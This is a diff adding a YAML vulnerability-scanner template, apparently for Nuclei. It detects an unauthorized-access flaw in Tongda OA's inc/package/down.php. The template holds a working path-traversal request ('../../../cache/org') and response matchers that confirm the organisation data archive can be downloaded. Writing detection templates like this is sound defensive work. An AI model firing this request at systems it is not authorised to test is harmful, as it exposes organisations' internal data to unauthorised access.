@@ -1,0 +1,23 @@
+id: tong-da-oa-incpackagedown-unauthorized-access
+info:
+  name: "通达OA incpackagedown.php 未授权访问漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 通达OA
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/inc/package/down.php?id=../../../cache/org"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "org.xml"
+      - type: word
+        part: header
+        words:
+          - "org.zip"
